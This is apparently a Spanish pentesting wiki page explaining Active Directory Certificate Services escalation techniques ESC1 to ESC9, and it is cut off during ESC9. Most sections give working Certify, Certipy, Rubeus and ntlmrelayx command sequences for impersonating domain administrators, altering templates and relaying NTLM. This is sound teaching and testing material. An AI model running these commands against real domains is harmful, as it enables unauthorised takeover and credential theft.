# Escalada de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este es un resumen de las secciones sobre técnicas de escalada de las publicaciones:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Plantillas de certificados mal configuradas - ESC1

### Explicación

### Explicación de las plantillas de certificados mal configuradas - ESC1

- **La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.**
- **No se requiere la aprobación de un responsable.**
- **No se necesitan firmas del personal autorizado.**
- **Los descriptores de seguridad de las plantillas de certificados son demasiado permisivos, lo que permite a los usuarios con pocos privilegios obtener derechos de inscripción.**
- **Las plantillas de certificados están configuradas para definir EKU que facilitan la autenticación:**
- Se incluyen identificadores de Extended Key Usage (EKU), como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) o ningún EKU (SubCA).
- **La plantilla permite a los solicitantes incluir un subjectAltName en la Certificate Signing Request (CSR):**
- Active Directory (AD) da prioridad al subjectAltName (SAN) de un certificado para la verificación de identidad cuando está presente. Esto significa que, al especificar el SAN en una CSR, se puede solicitar un certificado para suplantar a cualquier usuario (por ejemplo, un administrador del dominio). La posibilidad de que el solicitante especifique un SAN se indica en el objeto AD de la plantilla de certificados mediante la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia del indicador `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que el solicitante especifique el SAN.

> [!CAUTION]
> La configuración descrita permite a los usuarios con pocos privilegios solicitar certificados con cualquier SAN de su elección, lo que permite autenticarse como cualquier principal del dominio mediante Kerberos o SChannel.

Esta característica a veces se habilita para permitir la generación sobre la marcha de certificados HTTPS o de host por parte de productos o servicios de deployment, o debido a una falta de comprensión.

Cabe señalar que crear un certificado con esta opción activa una advertencia, lo que no ocurre cuando se duplica una plantilla de certificados existente (como la plantilla `WebServer`, que tiene habilitado `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) y luego se modifica para incluir un OID de autenticación.<sup>[[6]](#references)</sup>

### Abuso

Para **buscar plantillas de certificados vulnerables**, puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para suplantar a un administrador** se podría ejecutar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Entonces puedes transformar el **certificado al formato `.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** de nuevo:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" pueden utilizarse para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de las plantillas de certificados dentro del esquema de configuración del Bosque de AD, específicamente aquellas que no requieren aprobación ni firmas, que poseen un EKU de Client Authentication o Smart Card Logon y que tienen habilitado el indicador `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, puede realizarse ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de certificados mal configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.
2. El requisito de aprobación del manager está deshabilitado.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad demasiado permisivo en la plantilla de certificado concede derechos de inscripción de certificados a usuarios con pocos privilegios.
5. **La plantilla de certificado está definida para incluir el Any Purpose EKU o ningún EKU.**

El **Any Purpose EKU** permite que un atacante obtenga un certificado para **cualquier propósito**, incluida la autenticación de cliente, la autenticación de servidor, la firma de código, etc. La misma **técnica utilizada para ESC3** puede emplearse para explotar este escenario.

Los certificados **sin EKU**, que actúan como certificados de CA subordinada, pueden explotarse para **cualquier propósito** y **también pueden utilizarse para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKU o campos arbitrarios en los nuevos certificados utilizando un certificado de CA subordinada.

Sin embargo, los nuevos certificados creados para la **autenticación de dominio** no funcionarán si la CA subordinada no es de confianza para el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante todavía puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían **utilizarse indebidamente** para una amplia variedad de propósitos (por ejemplo, firma de código, autenticación de servidor, etc.) y podrían tener implicaciones significativas para otras aplicaciones de la red, como SAML, AD FS o IPSec.<sup>[[6]](#references)</sup>

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del AD Forest, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Enrollment Agent mal configuradas - ESC3

### Explicación

Este escenario es como el primero y el segundo, pero **abusando** de un **EKU diferente** (Certificate Request Agent) y de **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Enrollment Agent** en la documentación de Microsoft, permite a un principal **inscribirse** para obtener un **certificado** **en nombre de otro usuario**.

El **“enrollment agent”** se **inscribe** en una **plantilla** de este tipo y utiliza el **certificado resultante para firmar conjuntamente un CSR en nombre del otro usuario**. Después **envía** el **CSR firmado conjuntamente** a la CA, inscribiéndose en una **plantilla** que **permite la “inscripción en nombre de”**, y la CA responde con un **certificado perteneciente al “otro” usuario**.<sup>[[6]](#references)</sup>

**Requisitos 1:**

- La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.
- Se omite el requisito de aprobación del administrador.
- No se requiere ninguna firma autorizada.
- El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo y concede derechos de inscripción a usuarios con pocos privilegios.
- La plantilla de certificado incluye el EKU Certificate Request Agent, lo que permite solicitar otras plantillas de certificados en nombre de otros principales.

**Requisitos 2:**

- La Enterprise CA concede derechos de inscripción a usuarios con pocos privilegios.
- Se omite la aprobación del administrador.
- La versión del esquema de la plantilla es 1 o superior a 2, y especifica un Application Policy Issuance Requirement que requiere el EKU Certificate Request Agent.
- Un EKU definido en la plantilla de certificado permite la autenticación en el dominio.
- No se aplican restricciones para los enrollment agents en la CA.

### Abuso

Puedes utilizar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **usuarios** a los que se permite **obtain** un **enrollment agent certificate**, las plantillas en las que los **agents** de enrollment pueden inscribirse y las **cuentas** en nombre de las cuales puede actuar el enrollment agent pueden estar restringidos por las CA empresariales. Esto se consigue abriendo el **snap-in** `certsrc.msc`, haciendo **right-clicking on the CA**, haciendo **clicking Properties** y, a continuación, **navigating** hasta la pestaña “Enrollment Agents”.

Sin embargo, cabe señalar que la configuración **default** de las CA es “**Do not restrict enrollment agents**”. Cuando los administradores habilitan la restricción de los enrollment agents y establecen “Restrict enrollment agents”, la configuración predeterminada sigue siendo extremadamente permisiva. Permite a **Everyone** inscribirse en todas las plantillas como cualquier usuario.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

El **security descriptor** de las **certificate templates** define los **permissions** que poseen los **AD principals** sobre la plantilla.

Si un **attacker** posee los **permissions** necesarios para **alterar** una **template** e **institute** cualquiera de las **exploitable misconfigurations** descritas en las **prior sections**, podría facilitarse una escalada de privilegios.

Entre los permisos relevantes aplicables a las plantillas de certificados se incluyen:<sup>[[6]](#references)</sup>

- **Owner:** Otorga control implícito sobre el objeto, permitiendo modificar cualquiera de sus atributos.
- **FullControl:** Permite ejercer autoridad completa sobre el objeto, incluida la capacidad de modificar cualquiera de sus atributos.
- **WriteOwner:** Permite cambiar el propietario del objeto a un principal bajo el control del atacante.
- **WriteDacl:** Permite ajustar los controles de acceso, lo que potencialmente concede FullControl a un atacante.
- **WriteProperty:** Autoriza la edición de cualquier propiedad del objeto.

### Abuse

Para identificar los principals con derechos de edición sobre las plantillas y otros objetos PKI, enumera con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un ejemplo de privesc como el anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocurre cuando un usuario tiene privilegios de escritura sobre una plantilla de certificados. Esto puede abusarse, por ejemplo, para sobrescribir la configuración de la plantilla de certificados y hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo edge `AddKeyCredentialLink` hacia `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, conocido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Aquí tienes un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificados con un solo comando. De forma **predeterminada**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el **parámetro `-save-old` para guardar la configuración anterior**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de acceso vulnerable a objetos PKI - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos además de las plantillas de certificados y la autoridad de certificación, puede afectar a la seguridad de todo el sistema AD CS. Estos objetos, que pueden tener un impacto significativo en la seguridad, incluyen:

- El objeto de equipo de AD del servidor de la CA, que puede verse comprometido mediante mecanismos como S4U2Self o S4U2Proxy.
- El servidor RPC/DCOM del servidor de la CA.
- Cualquier objeto o contenedor descendiente de AD dentro de la ruta de contenedor específica `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esta ruta incluye, entre otros, contenedores y objetos como el contenedor Certificate Templates, el contenedor Certification Authorities, el objeto NTAuthCertificates y el Enrollment Services Container.

La seguridad del sistema PKI puede verse comprometida si un atacante con pocos privilegios logra tomar el control de cualquiera de estos componentes críticos.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema tratado en la [**publicación de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también aborda las implicaciones del indicador **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, tal como lo describe Microsoft. Esta configuración, cuando se activa en una Certification Authority (CA), permite incluir **valores definidos por el usuario** en el **subject alternative name** de **cualquier solicitud**, incluidas las construidas a partir de Active Directory®. En consecuencia, esta funcionalidad permite a un **intruso** inscribirse mediante **cualquier plantilla** configurada para la **autenticación** del dominio, específicamente aquellas abiertas a la inscripción de usuarios **sin privilegios**, como la plantilla User estándar. Como resultado, se puede obtener un certificado que permita al intruso autenticarse como administrador del dominio o como **cualquier otra entidad activa** dentro del dominio.<sup>[[9]](#references)</sup>

**Nota**: El método para añadir **nombres alternativos** a una Certificate Signing Request (CSR) mediante el argumento `-attrib "SAN:"` en `certreq.exe` (denominado “Name Value Pairs”) presenta una **diferencia** con respecto a la estrategia de explotación de SANs en ESC1. En este caso, la distinción reside en **cómo se encapsula la información de la cuenta**: dentro de un atributo del certificado, en lugar de una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente **acceso remoto al registro**, por lo que un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar y explotar esta configuración incorrecta:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para modificar estos ajustes, suponiendo que se poseen derechos de **administración del dominio** o equivalentes, el siguiente comando puede ejecutarse desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para deshabilitar esta configuración en tu entorno, puedes eliminar el indicador con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Tras las actualizaciones de seguridad de mayo de 2022, los **certificados** emitidos recientemente contendrán una **extensión de seguridad** que incorpora la propiedad `objectSid` del **requester**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el `objectSid` del **requester**, no el SAN.\
> Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Weak Certificate Mappings), que prioriza el **SAN sobre la nueva extensión de seguridad**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

El control de acceso de una certificate authority se mantiene mediante un conjunto de permisos que regulan las acciones de la CA. Estos permisos pueden visualizarse accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando las propiedades y, a continuación, accediendo a la pestaña Security. Además, los permisos pueden enumerarse mediante el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Esto proporciona información sobre los permisos principales, concretamente **`ManageCA`** y **`ManageCertificates`**, que corresponden respectivamente a los roles de “administrador de CA” y “administrador de certificados”.<sup>[[6]](#references)</sup>

#### Abuse

Tener permisos **`ManageCA`** sobre una autoridad certificadora permite al principal manipular la configuración de forma remota mediante PSPKI. Esto incluye activar el flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier template, un aspecto crítico de la escalada de dominio.

Este proceso puede simplificarse mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, que permite realizar modificaciones sin interactuar directamente con la GUI.

Tener permisos **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, eludiendo eficazmente la protección de “aprobación del administrador de certificados de la CA”.

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

> [!WARNING]
> En el **ataque anterior**, se utilizaron permisos de **`Manage CA`** para **habilitar** el flag **EDITF_ATTRIBUTESUBJECTALTNAME2** y realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que se reinicie el servicio de CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso **`Manage CA`**, también se le permite **reiniciar el servicio**. Sin embargo, esto **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 podría no funcionar de forma predeterminada** en la mayoría de los entornos con parches debido a las actualizaciones de seguridad de mayo de 2022.

Por lo tanto, aquí se presenta otro ataque.

Requisitos:

- Solo el permiso **`ManageCA`**
- Permiso **`Manage Certificates`** (se puede conceder desde **`ManageCA`**)
- La plantilla de certificado **`SubCA`** debe estar **habilitada** (se puede habilitar desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con los derechos de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificado fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Por lo tanto, un **usuario** puede **solicitar** inscribirse en **`SubCA`**, lo que será **denegado**, pero **posteriormente el administrador emitirá el certificado**.<sup>[[6]](#references)</sup>

#### Abuso

Puedes **concederte el derecho de acceso `Manage Certificates`** añadiendo tu usuario como un nuevo responsable.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** se puede **habilitar en la CA** con el parámetro `-enable-template`. De forma predeterminada, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido los prerrequisitos para este ataque, podemos comenzar **solicitando un certificado basado en la plantilla `SubCA`**.

**Esta solicitud será denega**da**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestros permisos de **`Manage CA` y `Manage Certificates`**, podemos **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y, finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuso de la extensión Manage Certificates (SetExtension)

#### Explicación

Además de los abusos clásicos de ESC7 (habilitar atributos EDITF o aprobar solicitudes pendientes), **Certify 2.0** reveló una primitiva completamente nueva que solo requiere el rol *Manage Certificates* (también conocido como **Certificate Manager / Officer**) en la Enterprise CA.<sup>[[3]](#references)</sup>

El método RPC `ICertAdmin::SetExtension` puede ser ejecutado por cualquier principal que tenga *Manage Certificates*. Aunque tradicionalmente las CA legítimas usaban este método para actualizar extensiones en solicitudes **pendientes**, un atacante puede abusar de él para **añadir una *extensión de certificado no predeterminada*** (por ejemplo, un OID personalizado de *Certificate Issuance Policy* como `1.1.1.1`) a una solicitud que está esperando aprobación.

Debido a que la plantilla objetivo **no define un valor predeterminado para esa extensión**, la CA NO sobrescribirá el valor controlado por el atacante cuando la solicitud se emita finalmente. Por tanto, el certificado resultante contiene una extensión elegida por el atacante que puede:

* Cumplir los requisitos de Application / Issuance Policy de otras plantillas vulnerables (provocando privilege escalation).
* Inyectar EKUs o policies adicionales que otorguen al certificado una confianza inesperada en sistemas de terceros.

En resumen, *Manage Certificates* —considerado anteriormente la mitad “menos poderosa” de ESC7— ahora puede aprovecharse para lograr privilege escalation completo o persistencia a largo plazo, sin modificar la configuración de la CA ni requerir el derecho más restrictivo *Manage CA*.

#### Abuso de la primitiva con Certify 2.0

1. **Enviar una solicitud de certificado que permanezca *pending*.** Esto puede forzarse con una plantilla que requiera aprobación del manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Añadir una extensión personalizada a la solicitud pendiente** usando el nuevo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si la plantilla no define ya la extensión *Certificate Issuance Policies*, el valor anterior se conservará después de la emisión.*

3. **Emitir la solicitud** (si tu rol también tiene derechos de aprobación de *Manage Certificates*) o esperar a que un operador la apruebe. Una vez emitida, descarga el certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. El certificado resultante ahora contiene el OID malicioso de issuance-policy y puede utilizarse en ataques posteriores (por ejemplo, ESC13, domain escalation, etc.).

> NOTE: El mismo ataque puede ejecutarse con Certipy ≥ 4.7 mediante el comando `ca` y el parámetro `-set-extension`.

## NTLM Relay a Endpoints HTTP de AD CS – ESC8

### Explicación

> [!TIP]
> En entornos donde **AD CS está instalado**, si existe un **web enrollment endpoint vulnerable** y hay publicada al menos una **certificate template** que permita el enrollment de domain computers y la autenticación de clientes (como la plantilla predeterminada **`Machine`**), ¡**cualquier computer con el servicio spooler activo puede ser comprometido por un atacante**!

AD CS admite varios **métodos de enrollment basados en HTTP**, disponibles mediante server roles adicionales que los administradores pueden instalar. Estas interfaces para el certificate enrollment basado en HTTP son susceptibles a **NTLM relay attacks**. Un atacante, desde una **máquina comprometida, puede suplantar cualquier cuenta de AD que se autentique mediante NTLM entrante**. Mientras suplanta a la cuenta víctima, un atacante puede acceder a estas interfaces web para **solicitar un certificado de autenticación de cliente usando las certificate templates `User` o `Machine`**.

- La **web enrollment interface** (una aplicación ASP antigua disponible en `http://<caserver>/certsrv/`) utiliza HTTP únicamente de forma predeterminada, lo que no ofrece protección contra NTLM relay attacks. Además, permite explícitamente solo la autenticación NTLM mediante su header HTTP Authorization, por lo que métodos de autenticación más seguros como Kerberos no son aplicables.
- El **Certificate Enrollment Service** (CES), el **Certificate Enrollment Policy** (CEP) Web Service y el **Network Device Enrollment Service** (NDES) admiten de forma predeterminada la autenticación negotiate mediante su header HTTP Authorization. La autenticación Negotiate admite tanto **Kerberos** como **NTLM**, lo que permite a un atacante **degradar a la autenticación NTLM** durante relay attacks. Aunque estos web services habilitan HTTPS de forma predeterminada, HTTPS por sí solo **no protege contra NTLM relay attacks**. La protección contra NTLM relay attacks en servicios HTTPS solo es posible cuando HTTPS se combina con channel binding. Lamentablemente, AD CS no activa Extended Protection for Authentication en IIS, algo necesario para channel binding.<sup>[[6]](#references)</sup>

Un **problema** común de los NTLM relay attacks es la **corta duración de las sesiones NTLM** y la imposibilidad del atacante de interactuar con servicios que **requieren NTLM signing**.

No obstante, esta limitación se supera explotando un NTLM relay attack para obtener un certificado para el usuario, ya que el periodo de validez del certificado determina la duración de la sesión, y el certificado puede emplearse con servicios que **exigen NTLM signing**. Para consultar instrucciones sobre cómo utilizar un certificado robado, visita:


{{#ref}}
account-persistence.md
{{#endref}}

Otra limitación de los NTLM relay attacks es que **una máquina controlada por el atacante debe ser autenticada por una cuenta víctima**. El atacante puede esperar o intentar **forzar** esta autenticación:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera los **HTTP AD CS endpoints habilitados**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Autoridades de Certificación (CA) empresariales para almacenar los endpoints del Certificate Enrollment Service (CES). Estos endpoints se pueden analizar y enumerar utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

Certipy realiza de forma predeterminada la solicitud de un certificado basándose en la plantilla `Machine` o `User`, según si el nombre de la cuenta que se está retransmitiendo termina en `$`. La especificación de una plantilla alternativa puede lograrse mediante el uso del parámetro `-template`.

A continuación, puede emplearse una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para coaccionar la autenticación. Al tratarse de controladores de dominio, es necesario especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, denominado ESC9, impide la inclusión de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Este flag adquiere relevancia cuando `StrongCertificateBindingEnforcement` está establecido en `1` (el valor predeterminado), en contraste con un valor de `2`. Su relevancia aumenta en escenarios en los que podría explotarse un mapeo de certificados más débil para Kerberos o Schannel (como en ESC10), dado que la ausencia de ESC9 no modificaría los requisitos.<sup>[[7]](#references)</sup>

Las condiciones en las que la configuración de este flag resulta significativa incluyen:

- `StrongCertificateBindingEnforcement` no está ajustado a `2` (el valor predeterminado es `1`), o `CertificateMappingMethods` incluye el flag `UPN`.
- El certificado está marcado con el flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración `msPKI-Enrollment-Flag`.
- El certificado especifica cualquier EKU de autenticación de cliente.
